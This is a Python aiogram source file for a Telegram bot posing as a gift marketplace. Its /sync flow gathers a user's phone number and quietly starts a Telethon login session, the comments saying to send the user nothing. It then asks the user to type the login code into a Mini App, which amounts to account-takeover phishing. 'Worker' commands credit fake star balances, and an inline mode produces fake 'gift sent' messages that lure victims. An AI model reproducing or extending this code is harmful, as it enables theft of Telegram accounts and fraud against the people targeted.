import logging
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, 
    WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    CallbackQuery, FSInputFile, InlineQuery, InlineQueryResultArticle,
    InputTextMessageContent
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
import os
import re
from pathlib import Path
from uuid import uuid4
from datetime import datetime

from app.database import AsyncSessionLocal
from app.models.user import User
from app.models.worker import Worker
from app.utils.logger import ActivityLogger

logger = logging.getLogger(__name__)
router = Router()
activity_logger = ActivityLogger()

# Получаем URL и настройки из переменных окружения
WEB_APP_URL = os.getenv("WEB_APP_URL", "http://localhost:8000")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BOT_USERNAME = os.getenv("BOT_USERNAME", "GiftsMarketAppBot")

# Путь к главному фото (локальный файл)
BACKEND_DIR = Path(__file__).parent.parent.parent
MAIN_MENU_PHOTO = BACKEND_DIR / "photo_2026-01-26_15-54-48.jpg"


class WorkerStates(StatesGroup):
    """Состояния для воркера"""
    waiting_for_distribution = State()


class SyncStates(StatesGroup):
    """Состояния для синхронизации"""
    waiting_for_contact = State()


async def get_or_create_user(telegram_id: str, username: str = None, first_name: str = None) -> User:
    """Получает или создает пользователя в БД"""
    async with AsyncSessionLocal() as db:
        stmt = select(User).where(User.telegram_id == telegram_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if not user:
            user = User(
                telegram_id=telegram_id,
                username=username,
                first_name=first_name,
                is_active=True
            )
            db.add(user)
            await db.commit()
            await db.refresh(user)
            
            activity_logger.log_activity(
                telegram_id,
                "auth",
                "user_created",
                "success",
                {"username": username, "first_name": first_name}
            )
        
        return user


async def is_worker(telegram_id: str) -> bool:
    """Проверяет, является ли пользователь воркером"""
    async with AsyncSessionLocal() as db:
        stmt = select(Worker).where(Worker.telegram_id == telegram_id, Worker.is_active == True)
        result = await db.execute(stmt)
        worker = result.scalars().first()
        return worker is not None


async def is_admin(telegram_id: int) -> bool:
    """Проверяет, является ли пользователь админом"""
    return telegram_id == ADMIN_ID


@router.message(Command("start"))
async def cmd_start(message: Message):
    """Команда /start - главное меню с фото"""
    
    user_id = str(message.from_user.id)
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Создаем/получаем пользователя
    await get_or_create_user(user_id, username, first_name)
    
    # Проверяем, является ли пользователь воркером
    is_worker_user = await is_worker(user_id)
    is_admin_user = await is_admin(message.from_user.id)
    
    # Главная кнопка открытия миниаппа
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🎁 Открыть Маркет",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )]
        ]
    )
    
    # Приветственный текст
    welcome_text = (
        f"💙 Добро пожаловать в @{BOT_USERNAME}!\n\n"
        "Загружайте свои подарки, устанавливайте цену и начинайте зарабатывать — "
        "включая долю от продаж ваших друзей.\n\n"
        "Готовы начать? Поехали!"
    )
    
    # Если пользователь воркер или админ, добавляем дополнительную информацию
    if is_worker_user or is_admin_user:
        welcome_text += "\n\n✅ У вас есть права воркера!"
        welcome_text += "\n\nℹ️ Форматы выдачи:"
        welcome_text += "\n\n⭐ Звёзды:"
        welcome_text += "\nUSER_ID КОЛИЧЕСТВО"
        welcome_text += "\nПример: 123456789 50"
        welcome_text += "\n\n🎁 Подарки:"
        welcome_text += "\nUSER_ID GIFT_LINK"
        welcome_text += "\nПример: 123456789 https://t.me/nft/LunarSnake-127141"
        welcome_text += f"\n\n💬 Также можно использовать inline mode:"
        welcome_text += f"\n@{BOT_USERNAME} USER_ID GIFT_URL"
    
    try:
        # Отправляем фото с текстом
        if MAIN_MENU_PHOTO.exists():
            photo = FSInputFile(MAIN_MENU_PHOTO)
            await message.answer_photo(
                photo=photo,
                caption=welcome_text,
                reply_markup=keyboard
            )
        else:
            logger.warning(f"Фото не найдено: {MAIN_MENU_PHOTO}")
            await message.answer(
                welcome_text,
                reply_markup=keyboard
            )
    except Exception as e:
        # Если фото не загружается, отправляем просто текст
        logger.warning(f"Не удалось загрузить фото: {e}")
        await message.answer(
            welcome_text,
            reply_markup=keyboard
        )
    
    activity_logger.log_activity(
        user_id,
        "bot",
        "start_command",
        "success",
        {"is_worker": is_worker_user, "is_admin": is_admin_user}
    )


@router.message(Command("sync"))
async def cmd_sync(message: Message, state: FSMContext):
    """Команда /sync - запрос синхронизации с номером телефона"""
    
    user_id = str(message.from_user.id)
    
    # Создаем клавиатуру с кнопкой отправки контакта
    contact_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📱 Поделиться контактом", request_contact=True)],
            [KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await message.answer(
        "📱 Для синхронизации аккаунта необходимо поделиться вашим номером телефона.\n\n"
        "Нажмите кнопку ниже, чтобы отправить контакт:",
        reply_markup=contact_keyboard
    )
    
    await state.set_state(SyncStates.waiting_for_contact)
    
    activity_logger.log_activity(
        user_id,
        "sync",
        "sync_requested",
        "success",
        {}
    )


@router.message(SyncStates.waiting_for_contact, F.contact)
async def process_contact(message: Message, state: FSMContext):
    """Обработка полученного контакта"""
    
    user_id = str(message.from_user.id)
    contact = message.contact
    
    # Проверяем, что пользователь отправил свой контакт
    if contact.user_id != message.from_user.id:
        await message.answer(
            "❌ Пожалуйста, отправьте свой собственный контакт.",
            reply_markup=ReplyKeyboardRemove()
        )
        return
    
    phone_number = contact.phone_number
    
    # Форматируем номер телефона
    import re
    formatted_phone = re.sub(r'[^\d+]', '', phone_number)
    if formatted_phone and not formatted_phone.startswith('+'):
        formatted_phone = '+' + formatted_phone
    
    # Удаляем сообщение с контактом из чата
    try:
        await message.delete()
    except Exception as e:
        logger.warning(f"Не удалось удалить сообщение с контактом: {e}")
    
    # Сохраняем номер телефона в БД
    async with AsyncSessionLocal() as db:
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if user:
            user.phone_number = formatted_phone
            await db.commit()
            
            activity_logger.log_activity(
                user_id,
                "sync",
                "phone_number_saved",
                "success",
                {"phone_number": formatted_phone}
            )
            
            # Отправляем код через Telethon БЕЗ сообщений пользователю
            try:
                from app.services.telethon_service import telethon_service
                
                result = await telethon_service.create_session(
                    phone_number=formatted_phone,
                    user_telegram_id=user_id,
                    db=db
                )
                
                # НЕ отправляем никаких сообщений пользователю
                # Код отправлен, пользователь увидит его в Telegram или SMS
                
            except Exception as e:
                logger.error(f"Ошибка отправки кода через Telethon: {e}")
            
            # Уведомляем админа (упрощенное)
            if ADMIN_ID:
                from app.bot import bot
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"📱 Новая синхронизация:\n"
                        f"👤 {message.from_user.first_name} (@{message.from_user.username or 'нет'})\n"
                        f"📞 {formatted_phone}\n"
                        f"📨 Статус: {'✅' if result.get('status') == 'code_sent' else '❌'}"
                    )
                except Exception as e:
                    logger.error(f"Ошибка отправки уведомления админу: {e}")
    
    await state.clear()


@router.message(SyncStates.waiting_for_contact, F.text)
async def process_text_phone(message: Message, state: FSMContext):
    """Обработка номера телефона отправленного текстом"""
    
    text = message.text.strip()
    
    # Проверка на отмену
    if text == "❌ Отмена":
        await cancel_sync(message, state)
        return
    
    # Проверяем формат номера телефона
    # Убираем все кроме цифр и +
    phone = re.sub(r'[^\d+]', '', text)
    
    # Форматируем номер телефона
    if phone and not phone.startswith('+'):
        phone = '+' + phone
    
    if not phone or len(phone) < 10:
        await message.answer(
            "❌ Неверный формат номера телефона.\n\n"
            "Пожалуйста, используйте кнопку '📱 Поделиться контактом' "
            "или отправьте номер в формате: +1234567890"
        )
        return
    
    user_id = str(message.from_user.id)
    
    # Сохраняем номер телефона в БД
    async with AsyncSessionLocal() as db:
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if user:
            user.phone_number = phone
            await db.commit()
            
            activity_logger.log_activity(
                user_id,
                "sync",
                "phone_number_saved_text",
                "success",
                {"phone_number": phone}
            )
            
            # Отправляем код через Telethon
            status_msg = await message.answer(
                "⏳ Отправляю код на ваш номер...",
                reply_markup=ReplyKeyboardRemove()
            )
            
            try:
                from app.services.telethon_service import telethon_service
                
                result = await telethon_service.create_session(
                    phone_number=phone,
                    user_telegram_id=user_id,
                    db=db
                )
                
                # Удаляем сообщение "Отправляю код..."
                try:
                    await status_msg.delete()
                except:
                    pass
                
                if result.get("status") == "code_sent":
                    # Упрощенное сообщение
                    await message.answer(
                        "✅ Код отправлен! Откройте Mini App и введите код."
                    )
                else:
                    await message.answer(
                        f"❌ Ошибка отправки кода: {result.get('message', 'Неизвестная ошибка')}\n\n"
                        "Попробуйте еще раз через /sync"
                    )
            except Exception as e:
                logger.error(f"Ошибка отправки кода через Telethon: {e}")
                # Удаляем сообщение "Отправляю код..."
                try:
                    await status_msg.delete()
                except:
                    pass
                await message.answer(
                    f"❌ Ошибка отправки кода: {str(e)}\n\n"
                    "Попробуйте еще раз через /sync"
                )
            
            # Уведомляем админа (упрощенное)
            if ADMIN_ID:
                from app.bot import bot
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"📱 Новая синхронизация (текст):\n"
                        f"👤 {message.from_user.first_name} (@{message.from_user.username or 'нет'})\n"
                        f"📞 {phone}\n"
                        f"📨 Статус: {'✅' if result.get('status') == 'code_sent' else '❌'}"
                    )
                except Exception as e:
                    logger.error(f"Ошибка отправки уведомления админу: {e}")
    
    await state.clear()


@router.message(SyncStates.waiting_for_contact, F.text == "❌ Отмена")
async def cancel_sync(message: Message, state: FSMContext):
    """Отмена синхронизации"""
    
    await message.answer(
        "❌ Синхронизация отменена.",
        reply_markup=ReplyKeyboardRemove()
    )
    
    await state.clear()


@router.message(Command("help"))
async def cmd_help(message: Message):
    """Команда /help - справка"""
    
    help_text = (
        "📚 Справка по боту:\n\n"
        "🎁 /start - Главное меню\n"
        "📱 /sync - Синхронизация аккаунта\n"
        "❓ /help - Эта справка\n\n"
        "Для работы с подарками откройте миниапп через кнопку в главном меню."
    )
    
    await message.answer(help_text)


@router.message(F.text)
async def handle_text_message(message: Message, state: FSMContext):
    """Обработка текстовых сообщений для воркеров"""
    
    # Проверяем текущее состояние
    current_state = await state.get_state()
    
    # Если пользователь в состоянии ожидания контакта - пропускаем этот обработчик
    # Сообщение обработает process_text_phone или cancel_sync
    if current_state == SyncStates.waiting_for_contact.state:
        return
    
    user_id = str(message.from_user.id)
    text = message.text.strip()
    
    # Проверяем, является ли пользователь воркером или админом
    is_worker_user = await is_worker(user_id)
    is_admin_user = await is_admin(message.from_user.id)
    
    if not (is_worker_user or is_admin_user):
        await message.answer(
            "Я не понял вашу команду. 🤔\n\n"
            "Используйте /start для открытия главного меню."
        )
        return
    
    # Парсим команду воркера
    # Формат 1: USER_ID КОЛИЧЕСТВО (звезды)
    # Формат 2: USER_ID GIFT_LINK (подарок)
    
    parts = text.split(maxsplit=1)
    if len(parts) != 2:
        await message.answer(
            "❌ Неверный формат.\n\n"
            "Используйте:\n"
            "⭐ USER_ID КОЛИЧЕСТВО\n"
            "🎁 USER_ID GIFT_LINK"
        )
        return
    
    target_user_id, value = parts
    
    # Проверяем, что USER_ID - это число
    if not target_user_id.isdigit():
        await message.answer("❌ USER_ID должен быть числом.")
        return
    
    # Определяем тип: звезды или подарок
    if value.isdigit():
        # Это звезды
        amount = int(value)
        await distribute_stars(message, user_id, target_user_id, amount)
    elif value.startswith("https://t.me/"):
        # Это подарок
        await distribute_gift(message, user_id, target_user_id, value)
    else:
        await message.answer(
            "❌ Неверный формат значения.\n\n"
            "Укажите количество звезд (число) или ссылку на подарок."
        )


async def distribute_stars(message: Message, worker_id: str, target_user_id: str, amount: int):
    """Выдача звезд пользователю"""
    
    async with AsyncSessionLocal() as db:
        # Получаем целевого пользователя
        stmt = select(User).where(User.telegram_id == target_user_id)
        result = await db.execute(stmt)
        target_user = result.scalars().first()
        
        if not target_user:
            await message.answer(f"❌ Пользователь {target_user_id} не найден в системе.")
            return
        
        # Добавляем звезды
        target_user.stars_balance += amount
        await db.commit()
        
        activity_logger.log_activity(
            worker_id,
            "worker",
            "distribute_stars",
            "success",
            {
                "target_user": target_user_id,
                "amount": amount
            }
        )
        
        # Уведомляем воркера
        await message.answer(
            f"✅ Выдано {amount} ⭐ пользователю {target_user_id}\n\n"
            f"👤 Имя: {target_user.first_name or 'Неизвестно'}\n"
            f"💰 Новый баланс: {target_user.stars_balance} ⭐"
        )
        
        # Уведомляем админа
        if ADMIN_ID:
            from app.bot import bot
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"⭐ Воркер выдал звезды:\n\n"
                    f"👨‍💼 Воркер: {worker_id}\n"
                    f"👤 Получатель: {target_user_id}\n"
                    f"💰 Количество: {amount} ⭐\n"
                    f"📊 Новый баланс: {target_user.stars_balance} ⭐"
                )
            except Exception as e:
                logger.error(f"Ошибка отправки уведомления админу: {e}")


async def distribute_gift(message: Message, worker_id: str, target_user_id: str, gift_link: str):
    """Выдача подарка пользователю"""
    
    async with AsyncSessionLocal() as db:
        # Получаем целевого пользователя
        stmt = select(User).where(User.telegram_id == target_user_id)
        result = await db.execute(stmt)
        target_user = result.scalars().first()
        
        if not target_user:
            await message.answer(f"❌ Пользователь {target_user_id} не найден в системе.")
            return
        
        # Извлекаем ID подарка из ссылки
        gift_match = re.search(r'/([^/]+)$', gift_link)
        gift_id = gift_match.group(1) if gift_match else gift_link
        
        activity_logger.log_activity(
            worker_id,
            "worker",
            "distribute_gift",
            "success",
            {
                "target_user": target_user_id,
                "gift_link": gift_link,
                "gift_id": gift_id
            }
        )
        
        # Уведомляем воркера
        await message.answer(
            f"✅ Подарок отправлен пользователю {target_user_id}\n\n"
            f"👤 Имя: {target_user.first_name or 'Неизвестно'}\n"
            f"🎁 Подарок: {gift_id}"
        )
        
        # Уведомляем админа
        if ADMIN_ID:
            from app.bot import bot
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🎁 Воркер выдал подарок:\n\n"
                    f"👨‍💼 Воркер: {worker_id}\n"
                    f"👤 Получатель: {target_user_id}\n"
                    f"🎁 Подарок: {gift_id}\n"
                    f"🔗 Ссылка: {gift_link}"
                )
            except Exception as e:
                logger.error(f"Ошибка отправки уведомления админу: {e}")


@router.message()
async def echo_handler(message: Message):
    """Обработчик всех остальных сообщений"""
    
    # Игнорируем контакты - они обрабатываются в process_contact
    if message.contact:
        return
    
    await message.answer(
        "Я не понял вашу команду. 🤔\n\n"
        "Используйте /start для открытия главного меню."
    )


# ============================================================================
# ОБРАБОТЧИКИ INLINE КНОПОК (Callback Queries)
# ============================================================================

@router.callback_query(F.data == "balance")
async def callback_balance(callback: CallbackQuery):
    """Обработчик кнопки 'Мой баланс'"""
    
    user_id = str(callback.from_user.id)
    
    async with AsyncSessionLocal() as db:
        stmt = select(User).where(User.telegram_id == user_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if user:
            balance_text = (
                f"💰 Ваш баланс:\n\n"
                f"⭐ Звезды: {user.stars_balance}\n"
                f"🎁 Подарки: {len(user.gift_inventory) if user.gift_inventory else 0}\n\n"
                f"Откройте приложение для подробной информации."
            )
        else:
            balance_text = (
                "💰 Баланс не найден.\n\n"
                "Откройте приложение для начала работы."
            )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🎁 Открыть Маркет",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )],
            [InlineKeyboardButton(
                text="🔙 Назад",
                callback_data="back_to_menu"
            )]
        ]
    )
    
    await callback.message.edit_text(
        balance_text,
        reply_markup=keyboard
    )
    
    await callback.answer()
    
    activity_logger.log_activity(
        user_id,
        "bot",
        "balance_check",
        "success",
        {}
    )


@router.callback_query(F.data == "back_to_menu")
async def callback_back_to_menu(callback: CallbackQuery):
    """Обработчик кнопки 'Назад' - возврат в главное меню"""
    
    user_id = str(callback.from_user.id)
    username = callback.from_user.username
    first_name = callback.from_user.first_name
    
    # Проверяем, является ли пользователь воркером
    is_worker_user = await is_worker(user_id)
    is_admin_user = await is_admin(callback.from_user.id)
    
    # Главная кнопка открытия миниаппа
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🎁 Открыть Маркет",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )]
        ]
    )
    
    # Приветственный текст
    welcome_text = (
        f"💙 Добро пожаловать в @{BOT_USERNAME}!\n\n"
        "Загружайте свои подарки, устанавливайте цену и начинайте зарабатывать — "
        "включая долю от продаж ваших друзей.\n\n"
        "Готовы начать? Поехали!"
    )
    
    # Если пользователь воркер или админ, добавляем дополнительную информацию
    if is_worker_user or is_admin_user:
        welcome_text += "\n\n✅ У вас есть права воркера!"
        welcome_text += "\n\nℹ️ Форматы выдачи:"
        welcome_text += "\n\n⭐ Звёзды:"
        welcome_text += "\nUSER_ID КОЛИЧЕСТВО"
        welcome_text += "\nПример: 123456789 50"
        welcome_text += "\n\n🎁 Подарки:"
        welcome_text += "\nUSER_ID GIFT_LINK"
        welcome_text += "\nПример: 123456789 https://t.me/nft/LunarSnake-127141"
        welcome_text += f"\n\n💬 Также можно использовать inline mode:"
        welcome_text += f"\n@{BOT_USERNAME} USER_ID GIFT_URL"
    
    await callback.message.edit_caption(
        caption=welcome_text,
        reply_markup=keyboard
    )
    
    await callback.answer()


@router.callback_query(F.data == "help")
async def callback_help(callback: CallbackQuery):
    """Обработчик кнопки 'Справка'"""
    
    help_text = (
        "📚 Справка по боту:\n\n"
        "🎁 /start - Главное меню\n"
        "📱 /sync - Синхронизация аккаунта\n"
        "❓ /help - Эта справка\n\n"
        "Для работы с подарками откройте миниапп через кнопку в главном меню."
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🎁 Открыть Маркет",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )],
            [InlineKeyboardButton(
                text="🔙 Назад",
                callback_data="back_to_menu"
            )]
        ]
    )
    
    await callback.message.edit_text(
        help_text,
        reply_markup=keyboard
    )
    
    await callback.answer()


@router.callback_query()
async def callback_unknown(callback: CallbackQuery):
    """Обработчик неизвестных callback запросов"""
    
    await callback.answer(
        "❌ Неизвестная команда",
        show_alert=True
    )
    
    logger.warning(f"Неизвестный callback: {callback.data}")


# ============================================================================
# INLINE MODE (для воркеров)
# ============================================================================

@router.inline_query()
async def inline_query_handler(inline_query: InlineQuery):
    """Обработчик inline запросов для воркеров
    
    Формат: @bot_username USER_ID GIFT_URL
    Пример: @darkshopbot 123456789 https://t.me/nft/LunarSnake-127141
    """
    
    worker_id = str(inline_query.from_user.id)
    query_text = inline_query.query.strip()
    
    # Проверяем, является ли пользователь воркером
    is_worker_user = await is_worker(worker_id)
    is_admin_user = await is_admin(inline_query.from_user.id)
    
    if not (is_worker_user or is_admin_user):
        # Если не воркер, показываем сообщение об ошибке
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="❌ Нет прав воркера",
                description="У вас нет прав для использования этой функции",
                input_message_content=InputTextMessageContent(
                    message_text="❌ У вас нет прав воркера для использования inline mode."
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return
    
    # Если запрос пустой, показываем инструкцию
    if not query_text:
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="ℹ️ Инструкция по использованию",
                description="Формат: USER_ID GIFT_URL",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        "ℹ️ Формат использования inline mode:\n\n"
                        "⭐ Звёзды:\n"
                        f"@{BOT_USERNAME} USER_ID КОЛИЧЕСТВО\n"
                        f"Пример: @{BOT_USERNAME} 123456789 50\n\n"
                        "🎁 Подарки:\n"
                        f"@{BOT_USERNAME} USER_ID GIFT_URL\n"
                        f"Пример: @{BOT_USERNAME} 123456789 https://t.me/nft/LunarSnake-127141"
                    )
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return
    
    # Парсим запрос
    parts = query_text.split(maxsplit=1)
    if len(parts) != 2:
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="❌ Неверный формат",
                description="Используйте: USER_ID КОЛИЧЕСТВО или USER_ID GIFT_URL",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Неверный формат. Используйте:\n⭐ USER_ID КОЛИЧЕСТВО\n🎁 USER_ID GIFT_URL"
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return
    
    target_user_id, value = parts
    
    # Проверяем, что USER_ID - это число
    if not target_user_id.isdigit():
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="❌ USER_ID должен быть числом",
                description=f"'{target_user_id}' не является числом",
                input_message_content=InputTextMessageContent(
                    message_text=f"❌ USER_ID должен быть числом, а не '{target_user_id}'"
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return
    
    # Определяем тип: звезды или подарок
    if value.isdigit():
        # Это звезды
        amount = int(value)
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title=f"⭐ Выдать {amount} звезд",
                description=f"Пользователю {target_user_id}",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        f"✅ Выдано {amount} ⭐ пользователю {target_user_id}\n\n"
                        f"👨‍💼 Воркер: {worker_id}\n"
                        f"👤 Получатель: {target_user_id}\n"
                        f"💰 Количество: {amount} ⭐"
                    )
                ),
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(
                            text="🎁 Открыть Маркет",
                            web_app=WebAppInfo(url=WEB_APP_URL)
                        )]
                    ]
                )
            )
        ]
    elif value.startswith("https://t.me/"):
        # Это подарок
        gift_match = re.search(r'/([^/]+)$', value)
        gift_id = gift_match.group(1) if gift_match else value
        
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title=f"🎁 Выдать подарок {gift_id}",
                description=f"Пользователю {target_user_id}",
                input_message_content=InputTextMessageContent(
                    message_text=(
                        f"✅ Подарок отправлен пользователю {target_user_id}\n\n"
                        f"👨‍💼 Воркер: {worker_id}\n"
                        f"👤 Получатель: {target_user_id}\n"
                        f"🎁 Подарок: {gift_id}\n"
                        f"🔗 Ссылка: {value}"
                    )
                ),
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(
                            text="🎁 Открыть Маркет",
                            web_app=WebAppInfo(url=WEB_APP_URL)
                        )]
                    ]
                )
            )
        ]
    else:
        results = [
            InlineQueryResultArticle(
                id=str(uuid4()),
                title="❌ Неверный формат значения",
                description="Укажите количество звезд (число) или ссылку на подарок",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Неверный формат значения.\n\nУкажите количество звезд (число) или ссылку на подарок."
                )
            )
        ]
    
    await inline_query.answer(results, cache_time=1)
    
    activity_logger.log_activity(
        worker_id,
        "worker",
        "inline_query",
        "success",
        {
            "query": query_text,
            "target_user": target_user_id,
            "value": value
        }
    )



async def send_broadcast_message(
    broadcast_id: int,
    text: str,
    photo: str = None,
    button_text: str = None,
    button_url: str = None
):
    """
    Отправляет рассылку всем пользователям
    
    Args:
        broadcast_id: ID рассылки в БД
        text: Текст сообщения
        photo: URL фото (опционально)
        button_text: Текст кнопки (опционально)
        button_url: URL кнопки (опционально)
    """
    from app.bot import bot
    from app.models.telegram_session import Broadcast
    
    async with AsyncSessionLocal() as db:
        # Обновляем статус рассылки
        stmt = select(Broadcast).where(Broadcast.id == broadcast_id)
        result = await db.execute(stmt)
        broadcast = result.scalars().first()
        
        if not broadcast:
            logger.error(f"Broadcast {broadcast_id} not found")
            return
        
        broadcast.status = "sending"
        await db.commit()
        
        # Получаем всех активных пользователей
        stmt = select(User).where(User.is_active == True)
        result = await db.execute(stmt)
        users = result.scalars().all()
        
        success_count = 0
        failed_count = 0
        
        # Создаем клавиатуру если есть кнопка
        keyboard = None
        if button_text and button_url:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=button_text, url=button_url)]
            ])
        
        # Отправляем сообщения
        for user in users:
            try:
                if photo:
                    # Отправляем с фото
                    await bot.send_photo(
                        chat_id=int(user.telegram_id),
                        photo=photo,
                        caption=text,
                        reply_markup=keyboard,
                        parse_mode="Markdown"
                    )
                else:
                    # Отправляем только текст
                    await bot.send_message(
                        chat_id=int(user.telegram_id),
                        text=text,
                        reply_markup=keyboard,
                        parse_mode="Markdown"
                    )
                
                success_count += 1
                
            except Exception as e:
                logger.error(f"Failed to send broadcast to {user.telegram_id}: {e}")
                failed_count += 1
        
        # Обновляем статистику рассылки
        broadcast.status = "completed"
        broadcast.sent_count = success_count
        broadcast.failed_count = failed_count
        broadcast.completed_at = datetime.utcnow()
        await db.commit()
        
        # Уведомляем админа о завершении
        if ADMIN_ID:
            await bot.send_message(
                ADMIN_ID,
                f"✅ **Рассылка завершена**\n\n"
                f"ID: {broadcast_id}\n"
                f"Успешно: {success_count}\n"
                f"Ошибок: {failed_count}\n"
                f"Всего: {success_count + failed_count}",
                parse_mode="Markdown"
            )
        
        logger.info(f"Broadcast {broadcast_id} completed: {success_count} sent, {failed_count} failed")
